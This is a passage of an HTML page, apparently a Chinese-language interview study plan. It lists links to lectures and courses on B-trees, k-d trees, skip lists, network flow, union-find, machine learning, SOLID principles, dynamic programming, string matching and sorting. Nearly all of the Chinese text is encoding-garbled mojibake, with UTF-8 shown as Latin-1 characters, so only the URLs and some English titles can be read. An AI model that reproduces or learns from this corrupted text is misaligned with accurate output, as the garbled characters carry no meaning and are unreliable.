26ï¼šå¹³è¡¡æŸ¥æ‰¾æ ‘ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=DQdMYevEyE4&amp;index=4&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6">è‡ªåº•å‘ä¸Šçš„2-4æ ‘ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=2679VQ26Fp4&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6&amp;index=5">è‡ªé¡¶å‘ä¸‹çš„2-4æ ‘ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><p><strong>N å‰æ ‘ï¼ˆK å‰æ ‘ã€M å‰æ ‘ï¼‰</strong></p><ul><li>æ³¨æ„ï¼šN æˆ– K æŒ‡çš„æ˜¯åˆ†æ”¯ç³»æ•°ï¼ˆå³æ ‘çš„æœ€å¤§åˆ†æ”¯æ•°ï¼‰ï¼š</li><li>äºŒå‰æ ‘æ˜¯ä¸€ç§åˆ†æ”¯ç³»æ•°ä¸º2çš„æ ‘</li><li>2-3æ ‘æ˜¯ä¸€ç§åˆ†æ”¯ç³»æ•°ä¸º3çš„æ ‘</li><li><a href="https://en.wikipedia.org/wiki/K-ary_tree">K å‰æ ‘</a></li></ul></li><li><p><strong>B æ ‘</strong></p><ul><li>æœ‰è¶£çš„æ˜¯ï¼šä¸ºå•¥å« B ä»ç„¶æ˜¯ä¸€ä¸ªç¥ç§˜ã€‚å› ä¸º B å¯ä»£è¡¨æ³¢éŸ³ï¼ˆBoeingï¼‰ã€å¹³è¡¡ï¼ˆBalancedï¼‰æˆ– Bayerï¼ˆè”åˆåˆ›é€ è€…ï¼‰</li><li>å®é™…ä¸­ï¼šB æ ‘ä¼šè¢«å¹¿æ³›é€‚ç”¨äºæ•°æ®åº“ä¸­ï¼Œè€Œç°ä»£å¤§å¤šæ•°çš„æ–‡ä»¶ç³»ç»Ÿéƒ½ä¼šä½¿ç”¨åˆ°è¿™ç§æ ‘ï¼ˆæˆ–å˜ç§)ã€‚é™¤äº†è¿ç”¨åœ¨æ•°æ®åº“ä¸­ï¼ŒB æ ‘ä¹Ÿä¼šè¢«ç”¨äºæ–‡ä»¶ç³»ç»Ÿä»¥å¿«é€Ÿè®¿é—®ä¸€ä¸ªæ–‡ä»¶çš„ä»»æ„å—ã€‚ä½†å­˜åœ¨ç€ä¸€ä¸ªåŸºæœ¬çš„é—®é¢˜ï¼Œé‚£å°±æ˜¯å¦‚ä½•å°†æ–‡ä»¶å— i è½¬æ¢æˆä¸€ä¸ªç¡¬ç›˜å—ï¼ˆæˆ–ä¸€ä¸ªæŸ±é¢-ç£å¤´-æ‰‡åŒºï¼‰ä¸Šçš„åœ°å€ã€‚</li><li><a href="https://en.wikipedia.org/wiki/B-tree">B æ ‘</a></li><li><a href="http://btechsmartclass.com/data_structures/b-trees.html">B æ ‘æ•°æ®ç»“æ„</a></li><li><a href="https://www.youtube.com/watch?v=I22wEC1tTGo&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6&amp;index=6">B æ ‘çš„ä»‹ç»ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=s3bCdZGrgpA&amp;index=7&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6">B æ ‘çš„å®šä¹‰åŠå…¶æ’å…¥æ“ä½œï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=svfnVhJOfMc&amp;index=8&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6">B æ ‘çš„åˆ é™¤æ“ä½œï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=V3omVLzI0WE&amp;index=7&amp;list=PLUl4u3cNGP61hsJNdULdudlRL493b-XZf">MIT 6.851 â€”â€” å†…å­˜å±‚æ¬¡æ¨¡å—ï¼ˆMemory Hierarchy Modelsï¼‰ï¼ˆè§†é¢‘ï¼‰</a><ul><li>è¦†ç›–æœ‰é«˜é€Ÿç¼“å­˜å‚æ•°æ— å…³å‹ï¼ˆcache-obliviousï¼‰B æ ‘å’Œéå¸¸æœ‰è¶£çš„æ•°æ®ç»“æ„</li><li>å¤´37åˆ†é’Ÿè®²è¿°çš„å¾ˆä¸“ä¸šï¼Œæˆ–è®¸å¯ä»¥è·³è¿‡ï¼ˆB æŒ‡å—çš„å¤§å°ã€å³ç¼“å­˜è¡Œçš„å¤§å°ï¼‰</li></ul></li></ul></li></ul></li><li><h3><span id="k-d-shu">k-Dæ ‘</span></h3><ul><li>éå¸¸é€‚åˆåœ¨çŸ©å½¢æˆ–æ›´é«˜ç»´åº¦çš„å¯¹è±¡ä¸­æŸ¥æ‰¾ç‚¹æ•°</li><li>æœ€é€‚åˆkè¿‘é‚»</li><li><a href="https://www.youtube.com/watch?v=W94M9D_yXKk">Kdæ ‘ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=Y4ZgLlDfKDg">kNN K-dæ ‘ç®—æ³•ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><h3><span id="tiao-biao">è·³è¡¨</span></h3><ul><li>â€œæœ‰ä¸€ç§éå¸¸è¿·å¹»çš„æ•°æ®ç±»å‹â€ - Skiena</li><li><a href="https://www.youtube.com/watch?v=2g9OSRKJuzM&amp;index=10&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">éšæœºåŒ–: è·³è¡¨ (è§†é¢‘)</a></li><li><a href="https://en.wikipedia.org/wiki/Skip_list">æ›´ç”ŸåŠ¨è¯¦ç»†çš„è§£é‡Š</a></li></ul></li><li><h3><span id="wang-luo-liu">ç½‘ç»œæµ</span></h3><ul><li><a href="https://www.youtube.com/watch?v=v1VgJmkEJW0">5åˆ†é’Ÿç®€æ Ford-Fulkersonâ”€â”€ä¸€æ­¥æ­¥ç¤ºä¾‹ (è§†é¢‘)</a></li><li><a href="https://www.youtube.com/watch?v=v1VgJmkEJW0">Ford-Fulkerson ç®—æ³• (è§†é¢‘)</a></li><li><a href="https://www.youtube.com/watch?v=2vhN4Ice5jI">ç½‘ç»œæµ (è§†é¢‘)</a></li></ul></li><li><h3><span id="bu-xiang-jiao-ji-amp-lian-he-cha-zhao">ä¸ç›¸äº¤é›† &amp; è”åˆæŸ¥æ‰¾</span></h3><ul><li><a href="https://www.youtube.com/watch?v=MAEGXTwmUsI&amp;list=PL-XXv-cvA_iAlnI-BQr9hjqADPBtujFJd&amp;index=21">UCB 61B - ä¸ç›¸äº¤é›†ï¼›æ’åº &amp; é€‰æ‹©(è§†é¢‘)</a></li><li><a href="https://www.coursera.org/learn/algorithms-part1/home/week/1">Sedgewickç®—æ³•â”€â”€Union-Findï¼ˆ6è§†é¢‘ï¼‰</a></li></ul></li><li><h3><span id="kuai-su-chu-li-de-shu-xue">å¿«é€Ÿå¤„ç†çš„æ•°å­¦</span></h3><ul><li><a href="https://www.youtube.com/watch?v=eCaXlAaN2uE&amp;index=11&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">æ•´æ•°è¿ç®—, Karatsuba ä¹˜æ³• (è§†é¢‘)</a></li><li><a href="https://www.youtube.com/watch?v=ru7mWZJlRQg">ä¸­å›½å‰©ä½™å®šç† (åœ¨å¯†ç å­¦ä¸­çš„ä½¿ç”¨) (è§†é¢‘)</a></li></ul></li><li><h3><span id="shu-dui-treap">æ ‘å † (Treap)</span></h3><ul><li>ä¸€ä¸ªäºŒå‰æœç´¢æ ‘å’Œä¸€ä¸ªå †çš„ç»„åˆ</li><li><a href="https://en.wikipedia.org/wiki/Treap">æ ‘å †</a></li><li><a href="https://www.youtube.com/watch?v=6podLUYinH8">æ•°æ®ç»“æ„ï¼šæ ‘å †çš„è®²è§£ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.cs.cmu.edu/~scandal/papers/treaps-spaa98.pdf">é›†åˆæ“ä½œçš„åº”ç”¨(Applications in set operations)</a></li></ul></li><li><h3><span id="xian-xing-gui-hua-linear-programming-shi-pin">çº¿æ€§è§„åˆ’ï¼ˆLinear Programmingï¼‰ï¼ˆè§†é¢‘ï¼‰</span></h3><ul><li><a href="https://www.youtube.com/watch?v=M4K6HYLHREQ">çº¿æ€§è§„åˆ’</a></li><li><a href="https://www.youtube.com/watch?v=2ACJ9ewUC6U">å¯»æ‰¾æœ€å°æˆæœ¬</a></li><li><a href="https://www.youtube.com/watch?v=8AA_81xI3ik">å¯»æ‰¾æœ€å¤§å€¼</a></li><li><a href="https://www.youtube.com/watch?v=44pAWI7v5Zk">ç”¨ Python è§£å†³çº¿æ€§æ–¹ç¨‹å¼â”€â”€å•çº¯å½¢ç®—æ³•</a></li></ul></li><li><h3><span id="ji-he-tu-bao-geometry-convex-hull-shi-pin">å‡ ä½•ï¼šå‡¸åŒ…ï¼ˆGeometry, Convex hullï¼‰ï¼ˆè§†é¢‘ï¼‰</span></h3><ul><li><a href="https://youtu.be/XIAQRlNkJAw?list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;t=3164">Graph Alg. IV: å‡ ä½•ç®—æ³•ä»‹ç» - ç¬¬ 9 è¯¾</a></li><li><a href="https://www.youtube.com/watch?v=J5aJEcOr6Eo&amp;index=10&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm">Graham &amp; Jarvis: å‡ ä½•ç®—æ³• - ç¬¬ 10 è¯¾</a></li><li><a href="https://www.youtube.com/watch?v=EzeYI7p9MjU&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=2">åˆ†è€Œæ²»ä¹‹: å‡¸åŒ…, ä¸­å€¼æŸ¥æ‰¾</a></li></ul></li><li><h3><span id="chi-san-shu-xue">ç¦»æ•£æ•°å­¦</span></h3><ul><li>æŸ¥çœ‹ä¸‹é¢çš„è§†é¢‘</li></ul></li><li><h3><span id="ji-qi-xue-xi-machine-learning">æœºå™¨å­¦ä¹ ï¼ˆMachine Learningï¼‰</span></h3><ul><li>ä¸ºä»€ä¹ˆå­¦ä¹ æœºå™¨å­¦ä¹ ï¼Ÿ<ul><li><a href="https://backchannel.com/how-google-is-remaking-itself-as-a-machine-learning-first-company-ada63defcb70">è°·æ­Œå¦‚ä½•å°†è‡ªå·±æ”¹é€ æˆä¸€å®¶ã€Œæœºå™¨å­¦ä¹ ä¼˜å…ˆã€å…¬å¸ï¼Ÿ</a></li><li><a href="https://www.youtube.com/watch?v=QSaZGT4-6EY">æ™ºèƒ½è®¡ç®—æœºç³»ç»Ÿçš„å¤§è§„æ¨¡æ·±åº¦å­¦ä¹  (è§†é¢‘)</a></li><li><a href="https://www.youtube.com/watch?v=X769cyzBNVw">Peter Norvigï¼šæ·±åº¦å­¦ä¹ å’Œç†è§£ä¸è½¯ä»¶å·¥ç¨‹å’ŒéªŒè¯çš„å¯¹æ¯”</a></li></ul></li><li><a href="https://www.youtube.com/watch?v=Ja2hxBAwG_0">è°·æ­Œäº‘æœºå™¨å­¦ä¹ å·¥å…·ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/playlist?list=PLOU2XLYxmsIIuiBfYad6rFYQU_jL2ryal">è°·æ­Œå¼€å‘è€…æœºå™¨å­¦ä¹ æ¸…å• (Scikit Learn å’Œ Tensorflow) (è§†é¢‘)</a></li><li><a href="https://www.youtube.com/watch?v=oZikw5k_2FM">Tensorflow (è§†é¢‘)</a></li><li><a href="https://www.tensorflow.org/versions/r0.11/tutorials/index.html">Tensorflow æ•™ç¨‹</a></li><li><a href="http://www.analyticsvidhya.com/blog/2016/04/neural-networks-python-theano/">Python å®ç°ç¥ç»ç½‘ç»œå®ä¾‹æ•™ç¨‹ï¼ˆä½¿ç”¨ Theanoï¼‰</a></li><li>è¯¾ç¨‹:<ul><li><a href="https://www.coursera.org/learn/machine-learning">å¾ˆæ£’çš„åˆçº§è¯¾ç¨‹ï¼šæœºå™¨å­¦ä¹ </a><ul><li><a href="https://www.youtube.com/playlist?list=PLZ9qNFMHZ-A4rycgrgOYma6zxF4BZGGPW">è§†é¢‘æ•™ç¨‹</a></li><li>çœ‹ç¬¬ 12-18 é›†å¤ä¹ çº¿æ€§ä»£æ•°ï¼ˆç¬¬ 14 é›†å’Œç¬¬ 15 é›†æ˜¯é‡å¤çš„ï¼‰</li></ul></li><li><a href="https://www.coursera.org/learn/neural-networks">æœºå™¨å­¦ä¹ ä¸­çš„ç¥ç»ç½‘ç»œ</a></li><li><a href="https://www.udacity.com/course/deep-learning--ud730">Google æ·±åº¦å­¦ä¹ å¾®å­¦ä½</a></li><li><a href="https://www.udacity.com/course/machine-learning-engineer-nanodegree-by-google--nd009">Google/Kaggle æœºå™¨å­¦ä¹ å·¥ç¨‹å¸ˆå¾®å­¦ä½</a></li><li><a href="https://www.udacity.com/drive">æ— äººé©¾é©¶å·¥ç¨‹å¸ˆå¾®å­¦ä½</a></li><li><a href="http://www.thisismetis.com/explore-data-science">Metis åœ¨çº¿è¯¾ç¨‹ (ä¸¤ä¸ªæœˆ 99 ç¾å…ƒ)</a></li></ul></li><li>èµ„æº:<ul><li>ä¹¦ç±ï¼š<ul><li><a href="https://www.amazon.com/Python-Machine-Learning-Sebastian-Raschka/dp/1783555130/">Python æœºå™¨å­¦ä¹ </a></li><li><a href="https://www.amazon.com/Data-Science-Scratch-Principles-Python/dp/149190142X">Data Science from Scratch: First Principles with Python</a></li><li><a href="https://www.amazon.com/Introduction-Machine-Learning-Python-Scientists/dp/1449369413/">Python æœºå™¨å­¦ä¹ ç®€ä»‹</a></li></ul></li><li><a href="https://github.com/ZuzooVn/machine-learning-for-software-engineers">è½¯ä»¶å·¥ç¨‹å¸ˆçš„æœºå™¨å­¦ä¹ </a></li><li>Data Schoolï¼š<a href="http://www.dataschool.io/">http://www.dataschool.io/</a></li></ul></li></ul></li></ul><p>â€“</p><h2><span id="yi-xie-zhu-ti-de-e-wai-nei-rong">ä¸€äº›ä¸»é¢˜çš„é¢å¤–å†…å®¹</span></h2><pre><code>æˆ‘ä¸ºå‰é¢æåˆ°çš„æŸäº›ä¸»é¢˜å¢åŠ äº†ä¸€äº›é¢å¤–çš„å†…å®¹ï¼Œä¹‹æ‰€ä»¥æ²¡æœ‰ç›´æ¥æ·»åŠ åˆ°å‰é¢ï¼Œæ˜¯å› ä¸ºè¿™æ ·å¾ˆå®¹æ˜“å¯¼è‡´æŸä¸ªä¸»é¢˜å†…å®¹è¿‡å¤šã€‚æ¯•ç«Ÿä½ æƒ³åœ¨æœ¬ä¸–çºªæ‰¾åˆ°ä¸€ä»½å·¥ä½œï¼Œå¯¹å§ï¼Ÿ</code></pre><ul><li><p>SOLID</p><ul><li>[ ] <a href="https://www.youtube.com/watch?v=TMuno5RZNeE">Bob Martin SOLIDé¢å‘å¯¹è±¡å’Œæ•æ·è®¾è®¡çš„åŸç†ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] S â”€â”€ <a href="http://www.oodesign.com/single-responsibility-principle.html">å•ä¸€è´£ä»»åŸåˆ™</a> | <a href="http://www.javacodegeeks.com/2011/11/solid-single-responsibility-principle.html">å¯¹æ¯ä¸ªå¯¹è±¡çš„å•ä¸€è´£ä»»</a><ul><li><a href="https://docs.google.com/open?id=0ByOwmqah_nuGNHEtcU5OekdDMkk">æ›´å¤š</a></li></ul></li><li>[ ] O â”€â”€ <a href="http://www.oodesign.com/open-close-principle.html">å¼€æ”¾/å°é—­åŸåˆ™</a> | <a href="https://en.wikipedia.org/wiki/Open/closed_principle">åœ¨ç”Ÿäº§çº§åˆ«ä¸Šï¼Œå¯ä»¥æ‰©å±•å¯¹è±¡ï¼Œä½†ä¸èƒ½ä¿®æ”¹å¯¹è±¡</a><ul><li><a href="http://docs.google.com/a/cleancoder.com/viewer?a=v&amp;pid=explorer&amp;chrome=true&amp;srcid=0BwhCYaYDn8EgN2M5MTkwM2EtNWFkZC00ZTI3LWFjZTUtNTFhZGZiYmUzODc1&amp;hl=en">æ›´å¤š</a></li></ul></li><li>[ ] L â”€â”€ <a href="http://www.oodesign.com/liskov-s-substitution-principle.html">Liskov æ›¿æ¢åŸåˆ™</a> | <a href="http://stackoverflow.com/questions/56860/what-is-the-liskov-substitution-principle">åŸºæœ¬ç±»åˆ«å’Œæ´¾ç”Ÿç±»åˆ«éµå¾ªâ€œIS Aâ€åŸåˆ™</a><ul><li><a href="http://docs.google.com/a/cleancoder.com/viewer?a=v&amp;pid=explorer&amp;chrome=true&amp;srcid=0BwhCYaYDn8EgNzAzZjA5ZmItNjU3NS00MzQ5LTkwYjMtMDJhNDU5ZTM0MTlh&amp;hl=en">æ›´å¤š</a></li></ul></li><li>[ ] I â”€â”€ <a href="http://www.oodesign.com/interface-segregation-principle.html">æ¥å£éš”ç¦»åŸç†</a> | ä¸åº”å¼ºè¿«å®¢æˆ·ç«¯å®ç°ä¸ä½¿ç”¨çš„æ¥å£<ul><li><a href="https://www.youtube.com/watch?v=3CtAfl7aXAQ">5åˆ†é’Ÿäº†è§£æ¥å£éš”ç¦»åŸç†ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="http://docs.google.com/a/cleancoder.com/viewer?a=v&amp;pid=explorer&amp;chrome=true&amp;srcid=0BwhCYaYDn8EgOTViYjJhYzMtMzYxMC00MzFjLWJjMzYtOGJiMDc5N2JkYmJi&amp;hl=en">æ›´å¤š</a></li></ul></li><li>[ ] D â”€â”€ <a href="http://www.oodesign.com/dependency-inversion-principle.html">ä¾èµ–å€’ç½®åŸç†</a> | å‡å°‘å¯¹è±¡ç»„åˆä¸­çš„ä¾èµ–æ€§ã€‚<ul><li><a href="http://stackoverflow.com/questions/62539/what-is-the-dependency-inversion-principle-and-why-is-it-important">ä¾èµ–å€’ç½®åŸç†ä¸ºä½•å¦‚æ­¤é‡è¦ï¼Ÿ</a></li><li><a href="http://docs.google.com/a/cleancoder.com/viewer?a=v&amp;pid=explorer&amp;chrome=true&amp;srcid=0BwhCYaYDn8EgMjdlMWIzNGUtZTQ0NC00ZjQ5LTkwYzQtZjRhMDRlNTQ3ZGMz&amp;hl=en">æ›´å¤š</a></li></ul></li></ul></li><li><p>Union-Find</p><ul><li><a href="https://www.coursera.org/learn/data-structures/lecture/JssSY/overview">æ¦‚è§ˆ</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/EM5D0/naive-implementations">åˆçº§å®è·µ</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/Mxu0w/trees">æ ‘çŠ¶ç»“æ„</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/qb4c2/union-by-rank">åˆå¹¶æ ‘çŠ¶ç»“æ„</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/Q9CVI/path-compression">è·¯å¾„å‹ç¼©</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/GQQLN/analysis-optional">åˆ†æé€‰é¡¹</a></li></ul></li><li><p><strong>åŠ¨æ€è§„åˆ’çš„æ›´å¤šå†…å®¹</strong> (è§†é¢‘)</p><ul><li><a href="https://www.youtube.com/watch?v=OQ5jsbhAv_M&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=19">6.006: åŠ¨æ€è§„åˆ’ I: æ–æ³¢é‚£å¥‘æ•°åˆ—, æœ€çŸ­è·¯å¾„</a></li><li><a href="https://www.youtube.com/watch?v=ENyox7kNKeY&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=20">6.006: åŠ¨æ€è§„åˆ’ II: æ–‡æœ¬åŒ¹é…, äºŒåä¸€ç‚¹/é»‘æ°å…‹</a></li><li><a href="https://www.youtube.com/watch?v=ocZMDMZwhCY&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=21">6.006: åŠ¨æ€è§„åˆ’ III: æœ€ä¼˜åŠ æ‹¬å·æ–¹å¼, æœ€å°ç¼–è¾‘è·ç¦», èƒŒåŒ…é—®é¢˜</a></li><li><a href="https://www.youtube.com/watch?v=tp4_UXaVyx8&amp;index=22&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">6.006: åŠ¨æ€è§„åˆ’ IV: å‰ä»–æŒ‡æ³•ï¼Œæ‹“æ‰‘ï¼Œè¶…çº§é©¬é‡Œå¥¥.</a></li><li><a href="https://www.youtube.com/watch?v=Tw1k46ywN6E&amp;index=14&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">6.046: åŠ¨æ€è§„åˆ’: åŠ¨æ€è§„åˆ’è¿›é˜¶</a></li><li><a href="https://www.youtube.com/watch?v=NzgFUwOaoIw&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=15">6.046: åŠ¨æ€è§„åˆ’: æ‰€æœ‰ç‚¹å¯¹æœ€çŸ­è·¯å¾„</a></li><li><a href="https://www.youtube.com/watch?v=krZI60lKPek&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=12">6.046: åŠ¨æ€è§„åˆ’: æ›´å¤šç¤ºä¾‹</a></li></ul></li><li><p><strong>å›¾å½¢å¤„ç†è¿›é˜¶</strong> (è§†é¢‘)</p><ul><li><a href="https://www.youtube.com/watch?v=mUBmcbbJNf4&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=27">å¼‚æ­¥åˆ†å¸ƒå¼ç®—æ³•: å¯¹ç§°æ€§ç ´ç¼ºï¼Œæœ€å°ç”Ÿæˆæ ‘</a></li><li><a href="https://www.youtube.com/watch?v=kQ-UQAzcnzA&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=28">å¼‚æ­¥åˆ†å¸ƒå¼ç®—æ³•: æœ€å°ç”Ÿæˆæ ‘</a></li></ul></li><li><p>MIT <strong>æ¦‚ç‡è®º</strong> (è¿‡äºæ•°å­¦ï¼Œè¿›åº¦ç¼“æ…¢ï¼Œä½†è¿™å¯¹äºæ•°å­¦çš„ä¸œè¥¿å´æ˜¯å¿…è¦ä¹‹æ¶) (è§†é¢‘):</p><ul><li><a href="https://www.youtube.com/watch?v=SmFwFdESMHI&amp;index=18&amp;list=PLB7540DEDD482705B">MIT 6.042J - æ¦‚ç‡è®ºæ¦‚è¿°</a></li><li><a href="https://www.youtube.com/watch?v=E6FbvM-FGZ8&amp;index=19&amp;list=PLB7540DEDD482705B">MIT 6.042J - æ¡ä»¶æ¦‚ç‡ Probability</a></li><li><a href="https://www.youtube.com/watch?v=l1BCv3qqW4A&amp;index=20&amp;list=PLB7540DEDD482705B">MIT 6.042J - ç‹¬ç«‹</a></li><li><a href="https://www.youtube.com/watch?v=MOfhhFaQdjw&amp;list=PLB7540DEDD482705B&amp;index=21">MIT 6.042J - éšæœºå˜é‡</a></li><li><a href="https://www.youtube.com/watch?v=gGlMSe7uEkA&amp;index=22&amp;list=PLB7540DEDD482705B">MIT 6.042J - æœŸæœ› I</a></li><li><a href="https://www.youtube.com/watch?v=oI9fMUqgfxY&amp;index=23&amp;list=PLB7540DEDD482705B">MIT 6.042J - æœŸæœ› II</a></li><li><a href="https://www.youtube.com/watch?v=q4mwO2qS2z4&amp;index=24&amp;list=PLB7540DEDD482705B">MIT 6.042J - å¤§åå·®</a></li><li><a href="https://www.youtube.com/watch?v=56iFMY8QW2k&amp;list=PLB7540DEDD482705B&amp;index=25">MIT 6.042J - éšæœºæ¸¸èµ°</a></li></ul></li><li><p><a href="https://www.youtube.com/watch?v=oDniZCmNmNw&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=19">Simonson: è¿‘ä¼¼ç®—æ³• (è§†é¢‘)</a></p></li><li><p><strong>å­—ç¬¦ä¸²åŒ¹é…</strong></p><ul><li>Rabin-Karpï¼ˆè§†é¢‘ï¼‰<ul><li><a href="https://www.coursera.org/learn/data-structures/lecture/c0Qkw/rabin-karps-algorithm">Rabin Karps ç®—æ³•</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/nYrc8/optimization-precomputation">é¢„è®¡ç®—</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/h4ZLc/optimization-implementation-and-analysis">ä¼˜åŒ–ï¼šå®æ–½å’Œåˆ†æ</a></li><li><a href="https://www.youtube.com/watch?v=BRO7mVIFt08&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=9">è¡¨ç¿»å€ï¼ŒKarp-Rabin</a></li><li><a href="https://www.youtube.com/watch?v=w6nuXg0BISo&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=32">æ»šåŠ¨å“ˆå¸Œï¼Œæ‘Šé”€åˆ†æ</a></li></ul></li><li>Knuth-Morris-Pratt (KMP)ï¼š<ul><li><a href="https://www.youtube.com/watch?v=5i7oKodCRJo">Knuth-Morris-Prattï¼ˆKMPï¼‰å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•</a></li></ul></li><li>Boyerâ€“Moore å­—ç¬¦ä¸²æœç´¢ç®—æ³•<ul><li><a href="https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string_search_algorithm">Boyerâ€“Moore å­—ç¬¦ä¸²æœç´¢ç®—æ³•</a></li><li><a href="https://www.youtube.com/watch?v=QDZpzctPf10">é«˜çº§å­—ç¬¦ä¸²æœç´¢Boyer-Moore-Horspoolç®—æ³•ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><a href="https://www.coursera.org/learn/algorithms-on-strings/home/week/1">Courseraï¼šå­—ç¬¦ä¸²ç®—æ³•</a><ul><li>åˆšå¼€å§‹æ—¶å¾ˆæ£’ï¼Œä½†æ˜¯å½“å®ƒè¶…è¿‡ KMP æ—¶ï¼Œå®ƒå˜å¾—æ¯”éœ€è¦å¤æ‚å¾—å¤š</li><li>å¾ˆå¥½çš„å­—å…¸æ ‘è§£é‡Š</li><li>å¯ä»¥è·³è¿‡</li></ul></li></ul></li><li><p><strong>æ’åº</strong></p><ul><li><p>æ–¯å¦ç¦å¤§å­¦å…³äºæ’åºç®—æ³•çš„è§†é¢‘:</p><ul><li><a href="https://www.youtube.com/watch?v=ENp00xylP7c&amp;index=15&amp;list=PLFE6E58F856038C69">è¯¾ç¨‹ 15 | ç¼–ç¨‹æŠ½è±¡ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=y4M9IVgrVKo&amp;index=16&amp;list=PLFE6E58F856038C69">è¯¾ç¨‹ 16 | ç¼–ç¨‹æŠ½è±¡ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><p>Shai Simonson è§†é¢‘ï¼Œ<a href="http://www.aduni.org/">Aduni.org</a>:</p><ul><li><a href="https://www.youtube.com/watch?v=odNJmw5TOEE&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=2">ç®—æ³• - æ’åº - ç¬¬äºŒè®²ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=hj8YKFTFKEE&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=3">ç®—æ³• - æ’åº2 - ç¬¬ä¸‰è®²ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><p>Steven Skiena å…³äºæ’åºçš„è§†é¢‘:</p><ul><li><a href="https://youtu.be/ute-pmMkyuk?list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;t=1600">è¯¾ç¨‹ä» 26:46 å¼€å§‹ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=yLvp-pB8mak&amp;index=8&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">è¯¾ç¨‹ä» 27:40 å¼€å§‹ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=q7K9otnzlfE&amp;index=9&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">è¯¾ç¨‹ä» 35:00 å¼€å§‹ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=TvqIGu9Iupw&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=10">è¯¾ç¨‹ä» 23:50 å¼€å§‹ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li></ul></li></ul><h2><span id="shi-pin-xi-lie">è§†é¢‘ç³»åˆ—</span></h2><p>åä¸‹æ¥äº«å—ä¸€ä¸‹å§ã€‚â€œnetflix å’ŒæŠ€èƒ½â€ :P</p><ul><li><p><a href="https://www.youtube.com/playlist?list=PLrmLmBdmIlpsHaNTPP_jHHDx_os9ItYXr">ä¸ªäººçš„åŠ¨æ€è§„åˆ’é—®é¢˜åˆ—è¡¨ (éƒ½æ˜¯çŸ­è§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL038BE01D3BAEFDB0">x86 æ¶æ„ï¼Œæ±‡ç¼–ï¼Œåº”ç”¨ç¨‹åº (11 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PLE7DDD91010BC51F8">MIT 18.06 çº¿æ€§ä»£æ•°ï¼Œ2005 å¹´æ˜¥å­£ (35 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL3B08AE665AB9002A">ç»å¦™çš„ MIT å¾®ç§¯åˆ†ï¼šå•å˜é‡å¾®ç§¯åˆ†</a></p></li><li><p><a 